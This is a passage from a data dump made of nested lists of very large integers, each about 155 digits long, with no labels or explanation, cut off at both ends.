29886736552595519883319992247248149457610019840398963719509973386312257223947416508075812571335113282223653558270070172964993800758793377852389788994773673431, 30701899530615124727587898421070783425942491283937001597614531331687997043784868620441573192804734795524637418955591590478004322109571411722175449357207491543, 35208005304783205516800107297843476645649357417775383995189193549785127062634899858997318412108301097699070488731979400335932892904263594452315499632622233577, 34791598043179982651886653820258422562048568250526008512483995334165577159985357703710905896846718125723861054406372511341150858530105135628570507896692517010, 29309109294603331463854167467414113928122081133553922309286421574470681947452603080965116366296173477539334949511924147644167915293676140822037702654584802191, 33020216508193622704152574562022472134963345972090351386985373166199976405832015142758596952175509696693833071298084460890752098816868346613182993252324010358, 37490042240420716576060231293564531074702716986297926402130691326939632393721445582405050552664088131947724316238326989759132929291771357800131388575999037274, 35155161210707812500625427793835603241818262793389492956113747566977890029459018122707438205287803782013465292032063001209439459558022093109947005441851463913, 39220096150389713994326764339669594409557151704487867603913693463026509815597265533073023912646033175701872574637002323416303521425374925176428384032527671492, 30500790324317769302820259604810671743457758505929554251927726851548985048011770706717742455974497095738193325366289903920675626670865097344016161901680061184, 28508991790177729357571769180962068693937229888851152618200306431543220214685580859996671067625845855412192113663955779988234318304944349992749849807508431040, 38422570308183815922517867047043038364061027123815105710878821661640849813202828930328109715317033228365380585341135113617433734827436499550352613305919420016, 34250424680013536983442709466230668287522206812455584040120056240374844573914392201586384245560310460038658704284775881984306549671060228193976131747609140783, 35323932715684604200751521562983026702522843316283180564475493832233267207271437608298006281322823095245209679502962215541147871836692915593650777528305762074], [25934461316154648418899727835790401491664920086580173706957110777156314054053936145883658664436690928350207076640079119023068342294007445986393530612591181740, 24143090291456952826547582273841948756807950123658785675167118092404431691973995313341426480084913894699493324458368000510218377140191036763099129882810367049, 28247298316212867226418331221762856355981367763620919289556392624789251253871762795667562487310366404285711609490175180493931462710914280222825778790033598443, 25745138784146936129639637665265922606851334209746854225459209008137826403948066765406225728526000453586427536840852060527309476880563561536325450544567131144, 24050841844921867380812479827411342679390501214332510487185079314428612207369012740293899774154914283172764794230389967765628462501299134535811963131966278532, 23506927467812251074133691626657193897525769638524938780535115148791808316336156974918004380204301711978741068829929165871624318463274557296295371510925425687, 24231528506222709028630072150444914349540453609223368848879446122303564245082357617986587667516912909719972023510474138472776903947296335774322321680580570630, 21960661011217090086912108765704634790539044683400685113568325785994355798848678848130390194508213297712733105339658186681178019283261361525581203250219573605, 20345775396818185924941588441272090580752263641997793370205139377194828006332310193708863348489050292252524444002238792481123549623435013339760558483360283654, 20776105194202409743215562458195821641627641640514149971065337421702221952035664713804606044430714239483820914371652506203922305694496024755914127264714537887, 22968357401137658820200997216075338960342150985619772535977042825191878178438182644883377776422095642123562425828504255778694284281251771698412405655706372475, 24336939682635461341713764509673113276958026990414657664413837888081071403204807093423960710948551040641657947818925464162103105897594128691025771369227047270, 25461022808813501295110582962711506617114932749029191763732007790533263683622591773492406907058120928874564500474915594757122526642266532654004517913685685815, 25377344032125873827872597046035495531823654917693575602774156615882988179148279580412904464616685475994418169563926295724353305997366399041151575687433893161, 24135848931700464739487625146055396437193422119652977508322228847247168077813692333479806701307706618466528008091557054200759436539033226469066198945872674765, 25976634513357094424449772799683626537295652967150672730612664675118360390460398195579244353387027810734051185277428905905179382991439314044864672347025809234, 26903319349801369100020693002341234621699041277637387263352320277736886962596706122448026987157909095093336731511790378667816223066338032824211182806957260511, 28698318472003317894482649367278562247301556810293207240321905487912274234432664275278803299003637218185691427049411830736406898275874580054006745769477231635, 17703797542850955336791040087162138961568284429099401830728228527816762078221467041865177525718304018482760907375164319494978101443492075197092493530166416929, 23987792651143415790296282491416971610790441570639519055153216572256792531449749479319043717082497542709888450233070020413404101923219532759624916837683929395, 27321217243615307547814341789742860656976369880693610442945957344033427022479942618215614626419557727913035297507403065678708974915654958593928443817543268187, 25160351605177953746077272958872281929702573235678993099449704492919255322369770657657359878363546935000967800604061298905118011149452198358830153984195873646, 20630974351377870421650148487353204497378305337888281079545426266241343084318498337031290811856955992544488426199925466417282953990361668155421619885069380168, 20938675867234839388994620799700104982146929451797533811401269849977167475496399248450787690978433608617177926456214719446105416313168471521643673339180392730, 27135178403573176562364531727001127120472260210842572008366613143993100264522208011922492879063686920439106162144294247195980434646829825030588255343730243025, 24184663647814449629465032793691942904521098430164764577300163446806899103650250128981111488658710530412228552110569309965707896918024144902097293635380066430, 27508655456865854897683636028714179043608373478129312988121973819108330415103411522720583599089133144271034341433916291465420041152860880818404565540581641682, 19986409231477733192298946197744581986949297971050082537631920733929682819415126263671797479470330987746651892470565568511822428669045135105899311902247810990, 20508544828216169673722722974177500025158634404286984216711164468863927566590877082786810672851441101257790733103220256146205668880539934595221218163675754322, 29059395975557607254453768311482843091648555276576888305874796710355988134330832564957704126829275624359640816683505009251719538618012178491649271454108544967, 23008762146973583904000996902303599923171578385392888204055118900748881717717371328912587060218522178942298802203298145132417786603758817213360218524963795936, 23706115609390317528436267550294020853612653098156451619176575411131531285472286077396509564292152600119780051051769200606542680926120279322586208351557451854], [22575176113628562906163132345001796312707661755170914145157939184517606224226609493771094923862234758476922148856219180452695031186883452557503965282585817795, 26831799988157060387624622483053639160223177778890779024861707925288444396766515836191918218289488059262233254729415537412483855142649075414537218816410639531, 34756022707631036113569662851867555311641096492238949880679295202999560366096144055628260409639939697385766453158708502533899496954234285845898900639814244447, 29344779585161232492152161988691746474677017900761866644776249057999059791452319226335028972874354506203328742940268718344177569234262213549202678119363335374, 28332871720888741261324592839602247879517746261862437268416395882267831450090137316958183653445208341132746396787088526681851842668893388118235626557182607173, 27171306739753229040971978868301129882920484721833389441003914784348483987737660578507251416346202471684472665691865689379515506297015041537528158976385817254, 27571842805146487286535369880862182538488964669055236520380483809389198788856857561181909924536821041609466241048468711534431304144295081008637186272091321395, 29209497074282651661088200006538512196773991340016295715276002871661533874254621380994579948270004462817109080896460835854701688233315351773865751459310722329, 28455074527666179269191219124001935235820535603081413776531601971623931870517444200146261012255833554117831227220013059954455271747664828340943799858578664457, 26362146125135331459753572792827793697426223465980853369417890989355582362708583610208254380409158445861583714719572838825477381248502339611307935338604497443, 23785960278583352957807862837471198040679165183898539825039635348660056708900930956921136968737513713061479308646793549428194530974324231499907410024928811309, 28082433962920151153653517765609830837924624211622221458555210270926082671189193839712070802407750742271251634592628750265291589365902909749024545806516537136, 29181920267895379779506235611531575437961965069800820237487496785181846979191664632765652654440886721446726800025370474906981029651173736140377162576441323041, 26794047170773558948113011058038241757812693530016946486185276158153810365105621400311684870818553907453241185435625715962263397567067393646522361993485178775, 28440454826468263323524026094150276687048087628082844783350154565288509270769585270199878798639205727309369970769058715996980692709327407533729425504660165066, 31286345890044906870237573272046914134490654550630297375433416631675207551387436551462413033595922081280689272872342412361117629146179536512991319439446710222, 34276686788584504620745913881005773320439485043273358621675349455257652727294240847354817786699001922373255369524832981358702345835618342352609235132617582498, 29342357253768155837577360202753604372007412465680624110538998987865520317978850151660528623323592815393137778312731724900649380882779229939527100303308780137, 26027538704451833730672546671846591138763204287554981483080019265190781417005915728439299413292299362100252300780865690223374737405415052963816792214001585789, 24614151621338867007423541994736220194928363090640975108770285455948692472189014904333963223210458643229578736325029898600356242942168318305492057567375207117, 29697554762627382742294212013028993294414963802126056545891124316446750472679634477519896015760260280376131531418168469299244575275347957625137168834707893758, 27537859637348698007036756414760945318846809313646854983389872106097321842203570310807573221417346870997258378738777123714098585123931899708603109292898782358, 22099482368795529154488846813343499181689975815670709655900881199778460668554582464477848551133012648634269856414771731229526647489645041210801213711371397127, 29368629963531139173486609810394940290361863186996654520794063404211523828766280337635864820339175691020593008109849013207896855191595261214815461397929001954, 29466930092931548539345893953406814059464286695318125982471132451196705825676996435214257243962912416979388053877791396984167171907712571256890194186517489156, 29047536343763300547881082557012700519868479544897554673586761480951856150087013329934797779276993649237159748761210997807661894745558094355019533902864278750, 32432228129672599356098688418694229042555780418925554189095702633017408401991192970939203735364953070730969915546814589815427790743478604385405805965656446073, 23146195360135200477518642998985197127602041934245399896672300597694915398774371091179245717508912236939535153780843460405481700843333617106461241018699127777, 23471465280727377536867631834046059723658159319865745932356998039813899132790744094213846151229364225777526751443491672754294846870911415344985329429694142351, 32663297337290544503650786197615582948144313173706677410252967915644083227263964317398484250692859221172792525171643623000778771287880706571245777412783731099, 24224907384277331561340662666929284038514123033853744334459397640131394230133026493252663220625523263311784929584203577453491480765069716744623322692457294959, 28567250189876737369414522362552229108451492502627540125810041853712134409258873984632337517273790169366707307511767551872781884289882893539268662394058443052], [28388906925602420723969739871634323214394927546168333556815826723115052293005450765721086336261124925725200329634699585482166677283502155924142776546610238855, 31495058434380209127945627567134081883544022161510575152038983213415630253852578446110710569360276587499733099572399837456729796346771882705827028431548480760, 34851019279354882301223353309928841989058761077796910768483675741807603338333837004753762106351774438911340912485830466642639147661250047206887900680520624668, 31772313150071268467653620117593619822124936699174746458214444737343641696109041116150627715842872760604778945227236068138177090418836771832414279152841163192, 30696757430456338541541061899984970794574493634936164531229568142713035330751839433450063416974627263640435363962377763439246082567288912958487554116114376165, 31615506083761166031926752184353263666386729444116046823395082674857006734065733814597054579956136156038826543521343202193483916004466398407516955797791379995, 27611466076331110181813383474776547269276993727174228559595677069335015214520281744385826513447254210139013668680711532399736235824112371431496692658180490834, 27834807751471954367870221933020219584223974040231648796302660654065623160505248425721991607424792606562127161837720056014741227243913894057120050101920507887, 26249307506306642532548639872056289125223067544486519513488722349926558823179701032354362298202153787061811265083153663758616493157586776750223734420458903176, 31744607031770188371521159972478251591765414857513204916274366875637241025286197995167746269803704965088925757149041722693012125325060443229979800920833767234, 28467049591322132629903102356512522817445331354872941282610375136489740266892882302341839531131777895784974282521456111944246564886151276590642188146244749686, 28594305980355180244594991841533109823536451254201678823308952324976096202876722931278111608986127001170633962292540481691796060297895777782520966343756208710, 32390604046123935101990553752334120062016386448508684023179834362740290606330028274102705053238962576554782414623395657987753357679619156043347206789520389813, 28059765471998498597741053888256742783487967507088655215182146393028540142224092274023985355114142668115501624543894170943575142065363436139566062032651726559, 32710110076221585641461339367625544308419074485477294469356925816194111417480572650280966128698354365042393611426401753342437550719704363515274202861408791211, 30150000067677469202882083169751802891066079301773587633492077145424412511746091028936896962398201735153167425059499150712422810334727039746289121162189179949, 33265351061016943583607156883495007071741211801596608669446547496001609867180257370323279175513737628362486034221304844342709600384813229592814093454122844344, 34351863027155768286256577934183638367720448254402420435993585953983435567144770135966677877101192048970213600241802247976995194710796534703127433558322154572, 25203272834595790802226447474835188876587583507866473693791936706662894770966037989998599372012684175510206799357038874210891780067219065425958789511820675520, 27033572743286604357548035646399946750151005761991130538034888272657244002945899647847231939141655380642920690791002047249859559009600609662978711263467251877, 32851583812013802430309586065156809714478742333360631578966005436795510735177687466595586571155484981086617500835188327870931489176396314478238304929139150084, 29688009805727212417548365965453991920801352891224090147837038839411575402256584404990557513277424664804177548689617127843308290234314057435083173087471452390, 22593785106852461615368134016489850863597987058078643399807797139967789546458070447115159757345490591748868313496555654177218212767566325557737367973223944022, 30670447943757711451269940719494988849252323766382373945968500781832152722297687445506496533075017958704827854058785711655220858172653285276921240160015595101, 34550029853416364342295820041673758298843743138430777280184114819491544478833985526350497112576188575597533599710982853139994281389424358963817000385307751848, 31038209618959708253695565518540857988204637341027856738132780717330702255082233431050782532156320789318455134378470941934736570904679300201434608354857204823, 33443845526054456352179165941257880587586464279361874568054285448565337013883981787253124143509318962916004374170904242693745133580530205493036238806572085937, 22238798264118975907349172273008820067731118532160752390119110529891273756136748547997795218969271121917770044807021362553699260308158676248565498392630062441, 29818282200360833287638907405230524444534147140757877337221937114737605886834504735379977069142913413584124136214498705561409656664138690813509978704867415060, 33798747005991708067972769827625438999986480289978213461438371294248323456658612627485589419926172995619548194361780742644236994799925623247683890724390950587, 28635082888010411677314265814442343405537170660555008438466981675192050332010390846012659924400842148980186058226670894233151324357079694333860468252287645616, 34045201578477923202915859490519090178215434530853979048250712191458962775315660199629219669276929514842452957958486843631314124678575354086568009866875782365], [25927578813119426500948395570480196632587559660659183148571920835023642055655833583636699135295420084540365553807352734184695228496327411362099828799060316642, 24114370785359798904097880722745840191835966783576160263859767497799182372822401018342651619548525574229633908159989795714305118202319572123976824728860997008, 31412222638129848405139504021722209053207845201328439755376706924663369422660081377671663675218638612239807482701366704199855007173152263158818442751929516917, 28777827815970149987977014817334344667520949779503753735410793525015212517039084324455889181242321848759354872545326242164713411474209519497260036391867426204, 24100688495197901307931268808683571584534003486001439375428491969114023812314586537299732988101453693748475340797625724792750468639563911176015534810661072073, 22392154746391988052083436630178606057386552085235655320238363283261932187528746637855246631604929139343471885339553909332614310411785170467072504428293936063, 27020192115382526685728895429898976239655867647643819747486813148495651942794447721587774370533305606005347445230935279268969484880763266975292912012308459583, 27610650959716859160780433146236783313364005267667659374157358972122952972061415563235721950911146646705848401245380298992450022148842711976807803433556972585, 25127524183790323641711838212879476875479698023856265848843714618162154301492158817741966568767183547778477244753994758920490430060291025632666402927904092073, 24204867679034486825970340218042906000396249946242830229916761481529346654795600654224680915199161232446663397185986345600296821910885013664754492032403717390, 21246699763180541878844790544894256256660475160156743305741114879859048646271033899055288959135885483586387248130805606108086959333483495886755837921353483040, 27011188801658276629080048254735496070398948735863204550058745954225267884786308941766933445152242901467213969304373402638282580256603270629398827991627370617, 28686951389307632053406777296642403712778849292339481723282363866529763846546106291658219835101081138087638737105651155122444637410285386186560501578463500134, 24241384396731618680488787118649700666569700358694909878593635664861568405291337472230233736113978543797458584547168134582953138587596331933859499308533652480, 25230146746842567963914692116321248526796843911978493839629804119124744327949217473092394939726891137222360924651656822418075630672014992568233583494181510100, 29972025795905460021832148634219771454691484808491512519885547466121473233182399859607062278714943532753752113800291280010566907792920278959227459349498092176, 29660204658893180853094807157750933558318245703378140663888738208877346061605537804138493821131727585539962952088163284698452202921851635915287433264259404250, 27323996296369010045919467713967919659222028337448043373339872510608468167968665764420924030940164843155030808820461455367356120211940190173169521083312283437, 25396599784033741240568111227541902707042489306367127221230373424649035884892903876016530565831721600043999901052465763663337506185035881831470203868360135090, 24893026058742038147706241979340390748436177198681391060966786053158069317920128536429293177479683226314587851115392557071350183862050012767823715608140272633, 26145788570202530905320651904227534182991340395721360984321122101739250333983272345526167799049613058508075562101729999410275022879603119638194026893703033910, 25733325345484553976598109433564023112164319242578395406206929142613254331539510999294559956858068790827844767818481807006789840844679567767431891770611604881, 21947853794836388776440021818111076892699851907588978022421802809059656751986131417561337681656686722916260887156656129317122816193602724814449258058627057038, 26754205896650016830017527205246059696035299745525422453496566986468019001977778447108947937070520797364356827551873047087647306304452823516479178454653387484, 28620735340393273752365369500852866811254675187425633633841885068599606591827603533027078911782291592826221308314688896062374833825025059366584907297732735949, 26227828764433592623121192779857390933341541974064471189984187150170736165404127060908022993813953260786598521673762787774410107685188378953349599319120085717, 29585018924066153327478266523266536333031908493120014947715872661419137091196909649313707833739066244814496269920478667916345154443007948039349556084647675969, 22683421585372966792511166409972379917890521419194218848679779682599993285195372782406055096433542573985818414632515179973555008736885800390032917418632937209, 23207696092988390335531251844733692610300784965955920001920997830044797318450168059363626426516100333127282127676193359383383961705058697627873566193332724105, 27229476910583674990252383764009092583511102554891522790257990095124244501316336083644839802902097486137684692554540497047488486435007314054275220081946132234, 23563862118640107215425211312716443650982618691569614377331540090709601669209287277314042885648039500124700508814493320595385185836820266371001485388596069583, 28550385643193269580594210581502935893013384254573509645492178576885365095602812255978201139884309132883073141008652908838874752015626697323671049597371516527], [29979363681621917412693785309283670220859646777142373606333810490538149872778722809763276882955012231216262555859714480967296098688452498378467589576452901308, 28788717520117367767643479366009194452170847971761745294396773185795123531337026517856615353689361840589902640754760076998221585514516322180202416146844762128, 40400746966965591588741438280147691991626439867764723020893405850366726825264992867235822903356209131258985753583858069007768116603417759306782133069599230534, 33402891657620649671335541849301659324721199974042147285368325316208456934434967176802712631855620224787318364037645703409328700578335066841438253496793719569, 29267407517779526981516113036218241280940069721015090412122926052000543089461151355117876078613106307643001678051086656799690901770436200550173420850016969644, 27228940233685262106026983647913421480647041001262093316605119439053834749651078600725157428404503103790738331151654038822725541494244940144192507042260593104, 31667889431560790155741330379212813060229153281678656677734915589699236706416455187812048161857858644905096624061307356718369867988319266653566816266887162763, 30658109986491764088470137662781896632651760625874424215012935662492106524068153728534088925650117267689329963626763765822609325174218064575517870027290474897, 29215100990603255689392246309215836750214346378755910926468848104183327943075282921158132400581298982452834583932745372873286763759474962661086941948248022076, 30840314486201486518867731259681507108690599908412743708059799789077137653974377193309143397083670395393748784693417039472994664803358553804301951026066891264, 29087227413291958582273552207535409415440410085558487952872961593634789600039456782572776214550617212848859585803131286776045019599659320044699586730525106474, 29387863602674746352463057078502503180299549966902945247615232999006856852304795133461122844348675085724626525480966058180171155671212185133393108816208910987, 32386910970911164822201142018014539985186302677006004157300094321769292868391504009385899344487758285753789742620763557970242942307295819135735872714069547346, 32120487793750674028228440312165562894618037004707116714778276457564501744193382154687963397190134448096078974506134047384630745939702133984080270191938178858, 29256127583113775462779673970475537034791771437983120934318263422336330897059095367879851884685308473750921575826968271027573563236869180882780964716789240643, 32600478666492353386644508556008002664803441679030156472564111764704485162785347122411481413169149251818978202688086873674174349918862780513541034109727714944, 39049801680718485511779125743823492679042689478696553041627999451963295470399806618942685136913715555911402726910155566536463931679092809735516984219303338096, 33062559016823500908422542301056363377478090290189804349218075756550885927636762801970552350647316684609528175405784383227705639999018974730349581731321970354, 26816859654277647832889752651843710722611939365131817038222412383764360626104800008605295511092441758563784067699210734567532324465732569695987375457772304647, 29946877154640839814355619472448905698636312718463120150012178343364750552680155015956399672657116050040990724599086148396370630655267553104994890276847666624, 32292706695750282717534307055062666709110270298923901900246337468222682043069094883511338987756909202180585520065673574508100614025077990488624600447745501858, 34245248402331906105788456581422329289187254310237040449472153262354552399135834140495597686793818853346919017636175788387053164375701036198939409693220955954, 27375776447929146526276345430696430534420832641168613938334264629829013405234332205896043205389207854090597129003524699557763997305461053462490039771933780158, 27449739217182124978398312771941471799194122561672810379878492911077882063365407678364677748186610810165874899172922952482268623711861892922304577370066567049, 38617100748830261640895535510334154970757374990185570845997429916633630769225945885818512516330104684401507439706922911945586932539082502728404930486461054224, 35177709028913217162786860960341533517166494874250409388892077936684284824315086802376449826739457460986350454544109526301939898700802270937498022573878298494, 36529940092490199024444417674864539834053379675889102824529345184216141335535591236316811532409706962569279084928746661426683753622406763631345597603821837913, 26509977536548451757768713677269004183969957808999144621087453250246702055608616974035325527038769997317685360405547220097891009536775729352965454155841827091, 28464343838443578911655072898076284360125494074851585727519505936014142834572308975120249012248040179691041713570425482253940383453019610264475574405681017992, 34264290312084812394948351564903461181644973290456276942772047997108254331006809287334473716984961687958195847768932639664336319606581383231916409117405065546, 31044329212220131761551927840167946621420756407979274032715374139204851011822356885435427647292179713185688343462246317877214877092270931056216305454624446542, 36801230643706192970225502715362091490861686063418334134272376260989203268243703690389957211552302717604575411209410119027066899443244605549814110367210564334], [28446201896428062841612289860636878197845660092427982221213397275910168428252497807126644072915663289076293832500125536071409184545402886028445198673383720349, 28015974969061343502597250857136845070403362631863281953775968776212902977225742263213806780998312710346874313025574091390670564357832244176989580992190269751, 32177343750956829159515304877580271876916058854269267719241925515710146350712575287431981090292029389729294868795437300177905185116333403728414995605588215921, 28998101064559881993935891949301926116750695555143154872122462043087456514836404382068958614503054076784198530435816049176930541915433658837999480629547432020, 25606747792007772357597285861751990692999467825822351747361740174090589117058728199430336271763218534372381917709968669677935208381703031714721896716985686725, 26557789294972017961248713847952807348996611106006029489086597424669479423353105111700382441399850252617813110999642410568135907397741393643235211255947097156, 23650157585411945715413633485883126421985973460470147008252356233254090210998812322551707321302120360112656046948770773008431876302543241484431268110577249921, 26558864141944817744062829138794611602863643856173060727720486787616624088100507966851652572965312141309245925720311783618868581026850289561875472551888077915, 22448760700793634646592836313067252645057395560349971612978057829617278890020594941660782397761045176976714167922395950869326913456936375096639182049242146668, 24509989846840774354016113913441336149027406139719514062008969823468963428638000048941967430708290519804896568715229003211022722822684100743313150297552396013, 23199771179196852631644289097251317381677632345634490193982038871689457570141652844985788592519671836745874939659713524154215361049764812062109385695221691358, 28954858466356292328661391882068274020736485352843346467989877367855832748348378605549905704894542519739889623838596783724898821958112922144557700880673472640, 30612160584681498781401168259153434355676015408053180507147042598221988294303186931639517867454579085636236444319336271671623900591759775849002621685107307664, 27531221092374055441239289581461813615285863396496881254792274663988468157012087956556740201110442002488070371887688537828688455935544840668438872173394159396, 29541058722261266645668613109768707850657837702070134092421202118144291215336298273488379696058949751665598384700696118220231037672978174404903810803801121977, 27546112103366417108082105054002431184560452920774762604466814242792006278816445052678794058979730796490428819591878312600290479042835306391276245932866435118, 28554923674200527705754374737761342878483690123665324069652228678982669055454152835315802169508217075620039342826185118020173912173734513355752199674884116154, 33453587709741100549375668538163678365172700967515511005628119784364195916343985895496384512890350771862786931984202974117436368346824927822705784888104653063, 23678292514620183730148635536270464890659252549237140817229328755318359881945775702652401054930581195310356367520579299076965031429734305764643369642100595529, 25862870992250799166825424848984274008372116748197625733568409550355574101749791897534285439512921048309930398683011902888736893003673942287692706393843296454, 26586396719775104744960581198841720229036084932489219351078849404796658795867157257300243193445913040125436938836115791360061271430501173127141801056003124239, 27069455104928060989772713765714553079377497387137144451169634203641411412232715435880738300390014797151933505019434490976127992847389511092039672857199577042, 21823405413261510046279930527074471255178564283793073687235934726946952207812725191713962389774454461844422274111571226642904982410661362003898193031549203652, 27670822583118943171806944192588080979873533565728788910630467233263250532133214164941494473955180610052705523482428965342498383790082056579860922422157180862, 32957611147448582346679857574342897340263956254106592892237384950843917149651534172392266117282109879752069510173694492668039340672686287741422338612926290772, 28734842016356822689808974548616786295363389225727217410196217677274132456440922596588618106779558177529636503139012334489720988976205458342442607858633953450, 29280788225914776450949093427266281695435199270603295002184210968610984211736264269632002914386867150723143938314045809799153843698462406038205187446921325201, 23781010174728035515103740489214972006692480135835579235702485533760362679990952725316736105824882966220863927867552716818780747851832479383882452961908038530, 26700266539395415885391689530641958323182228612490244423214472140419135200921827697225849073888621039412536804556754091722335268207422463588059604786374474748, 30871803966076840632932122512411625486797498181033129205115508327588508331179218450181969039354293934427422782387600489501718329623687449215703867787641760733, 26920086929099132643641361903799819643783222615370573485771499807914993036910910647479395894603594440579175634656662225315121729650243143146499569494840000308, 32590822595915375825133298112612455157448271883979521532225405754487516766963857274395956878404100615103752775887730683299813003547755849478122568138395175256], [24994853760594905939654117408195466601179337472000609206533364191939919233888285037164949796625817690948734658084566001390532267079321949132486391581750862744, 25931274278805045444162552300797427570832533457480690508026175729263796910598244643868534132204577500554308988368694258837857457106956396015233240294211737775, 31107832350678554079116157123768638890458505586357618752935753007625853605967527697185536013273485728876172653036497959323369867289127270953181859060887357585, 29310089690214765775058299317283053561426688003722028966572822311579941193809619480203817474603611559062792924644382241148285894769118076294940579240077687699, 24157196051509350200263627809804394606260555417788116314351782180739123475690653375562483467827165293479676426085647406840421762726826305703492385101755237365, 24421975193911006982674176200124749760314631100312993821014642458473036786333165906382493711173714998892226597771038747749162210956651797982976069072231269903, 25331910194844717174304359106084285148886695577784075046962128765831405224362016351317092850252454933780297017821790348338604519335973567011467322207342097002, 27945075709227020099397947186024552553175672069779412079155033956329300616984891328510626404396265947229147070850868960357174166596523346195914036698858705138, 22990619683129987805340970886608621143890392391909989538696270302177567367666507247832647653205191059129474195315532812744592076310018475297773745759414392575, 22301324481650574877665769797291396796881759514403187825352606005444997351442438402617444885867074776106322262355473252062564019473894146767088060248011107306, 22284732889257941992565262995869898671342177737727522515240450313259225661683104497147494292050805921047294204023637858384728336162234673931578717388956778689, 25853727527385082035412368158100586853570794802362488016141318594778865789037352155764462913209040041826217172697767963705745263519620478423036116221998929714, 28786950099570350667775878427247648564752296158416441354120016024141380669745028254474379372371770507939691004847163231689937386643685758590894899648642626535, 22934036394697484004870766223526234044177426761961498791038988520637001121620217976961640567857715346974402226166635576668382702960091552638115577006284415862, 24793847508629937800522402360751846603886127392523112645372605161712593413838883922171037380915030034156975534502961922532631657852384154512748002762265577114, 27461598604272530073733393389355619434274725745605901326284688942731675313476223818670761337102577648644535048071888080360245160864656516576363695211738804815, 31583601397894729781908137341957349542823813757844050164063073821371562748052588863810630616602427392846935932306466417113392564759857675455445661117322151600, 24893329309773553647339132412141274245957925122551907785376511074707797463020052194208428791567166845577309203264559734280535700389982813533790566463107982080, 22349794808975308907227367939385173268328769670814653783845079574077202568452370243868526983433288748385960228657420520739010579129253594050474000700234227904, 26909718046836375121879908349989692237723853898256653300569151669088062891077166290788612770627460853435402975227410997593115637276652452901313655565015577235, 25547139137302762590983879800068832657121006963749236726575784616005107791082629061515376497703947353184852091201936268520014336817556820621638630464943161488, 26972532617767448946838890272551012426162245285914995923252005723231709711898936570075723513404653717496555305713399949450462748293003390468218561786547386940, 21945123617625145678197736647677957071799483754290814630423433271412276378334077144923764230039884652650807511976510922051500951799014669190997114590406533248, 21704653652612695322347530249921401371326921017322359250710019226694437660784366168984382815641801370582475867577705296200983690536554535282192443056282140835, 32385179278006669222614681075760441145158495612435230481738298191708215395711165594317654424364972139611753320639353666374669769654044100438028929688272765701, 26811835786851027890457077720115053050955902268995490898599544576811463285905334265538643847434263526170706255745403576608054255670753516185379177035604592115, 30177921754562902290201165379733700741088067217723653066285655190291517712502532635922773795609291994137527880512865052318612390649856609322287596645151307370, 21847979862435150754861431137143320702311858003742411838376226497358511354964589068600659180977124245125036472005378079305961303994852363198418839281721959997, 20517949437789406325638596422165360217056224497215232704282137155506257476140167840677000374226182981124450873013233489944131720909118422508991554940856032733, 26884232257170413514827109520222015964108736646796646955774933780368300936980361831077500072517812733568109857345973548346772011831260469406089759520982146365, 25625719355599877194524322874590229541380358643147185148783344598883163550398202048216167993328335361702327793769535225106692885684573651193565229177122672808, 29845854824260551396161091013180364384628347674615444051805757807522697080799328842521903151424180044420103319981593883595271437893277770450967576318114271320], [29505436775002109312912605611058852581584185516668145006009740271777723463495216270890928632458562523337050468954539343626222621715522509370590792206609335592, 27861226952980197487857143697527617940507010723686180732268713299660005911633789201431974174720042449131354263531610096670403069228044438880064687139425083770, 38664952126205679013571150006617287864410920431947371238240978183535396830156713619250699063416347360800727519747675530422143238330752138633631583656786597431, 31499098501365623377632519943658916412254646527663610687356569940889164344149024623194293100211761551306816091885801944774460721355618884125169916951887710246, 29568140425179075279823785129453428321517650703608581106811204132383337619580276619253371323196219229319261853775741924245409205365677319646487890432652845244, 26599226997998418529235239929350910997423181964412334852825885383077434164681851694505031460244917432269280751455230416983811430662672676951839785475378846329, 28071628345729790537957205163421861750563041702258685287952239900641497928089480132039324731454209063958218325434721283089195439357336652126446217417320605983, 28717196125175214269942669882668566273255305707307315495080770519725065436246458894398719621815401184365877776496196911951186230675482417791397466631419343604, 29058457150562186084627277655541193149892764232527694330777083846081237798288510551850567384504131706642598803261521798934019401236831925111289399885524493193, 31837911730591909803244083496917082956782435395189027178799009542801062381115139492682111644626914655029518792299339858495274269342275784885640904890858101909, 27980809954857698731024374274614941276053795580412436437440877046638264301064937508237168968250769836001147536867040080544458627655580228200496416131264124434, 30124746994873085139437435720957638744167651008057964952411301945600039634325262733850758004431640975827113978449417917676050746197179331386461387333306713371, 31237203057189813178850589511755580881785764406813590635288212706309109135520099516201699939831335426440493155569004158315892328433221351246367832514644935198, 32210306949194194208582541115415597949459217109588255537160451171887000115162623352041006325405223866190937787898330485765256520269569830891971641959697906738, 33326791151251815406612564839362668818188036246976940097535405699718819861054223469089113935757799360992032036182427382582652470016270922495071326436435720759, 32263649860050447972677175649976712078409753489349053289456868172015370158143844568665749437549586283891545131261621048819409328548336412182565174393391780804, 36004138691742222127768128609107791144283059107825070098639639450966632348029534885724181170701779643025150453218631862209946024638706998763279945665407864953, 36427359573600707863503499358225735479280377231972788976945147009066035487809102564734833816323189317931764568960924112078277595622217747624626617160054552252, 24584661212311545304756794573420499459711737243756444820908865626234973996439692754337527903500456755140639507345185184673056913425499162390572563621949485014, 31936819481452801363866283841180803136092918223242946780086645636671054480123374397389941277876529884459282194399738018594404677228243641062222970720496699245, 34850575811961143664823880217053146404797013607761946634282252517295424831742510741745472354039816351638307721394817963286020516434985964105760203470114332812, 32231776889430699107915167262995807612920216448772073397231344076115148331523273258328856632229301326856138526457334011747543882911234500147203017574836667072, 25004707191890872501166695222930442330697616012258814532330804432188370883944836285948767879131869547701243814353271516629271006023077243248764778589104949659, 30702888959445284228413962643331263391995554093737310636192874775668773677320429751943582551220245661912612438588777321756921716673882934189146414010028522075, 38323065128924499931418278688032169681157466011011607243845486403431577340485179116596202172945657353760851697641677261969464666820105083713121144748053139124, 30297705021121433192105349479472249805011350273416066300455023768869855238649332085937458515663992986557462577192531115631605354545136309707150673290697663996, 35052984350058656574572036371941461292565608698789880315512525511326428225451095327905719959243374485971466743357007955105607164178262023098442447017758829486, 23292117554864159510697323188411938710898629863985111698733362575824396986018620416753691241362922564481394041006416418494362832496171754810055465621585430325, 28129758866181086659768492691324671470831617772976235921321568974504732346821438246614552603813698878059423659538181028132490892182380400931653385452636346461, 31682327291718301696712035092683319005812019706168526037589371182114705006800686903717425970631796586141790959114481137020821852989102149122881779852687490873, 29496955372471152460908190159792344943220491041943488039629017356144598162592222307991191856526703186163943248721577017337742432652551105959344579222158184040, 35369733729661962387865950662067702916181451911391924203096905003977774970719740314295985624937414572667871576718335857716793231715186353906634048589119690391], [25521791740178335638335277419238496782817776541772711860261424791853332367301055354204952202665577606401477650141235893056596685894111650707736780821015353011, 24356581871371545076098908946691161948042711409778099146282312535903549523300245214446996373962196323874980010822231966033727576312977930015187305053624076622, 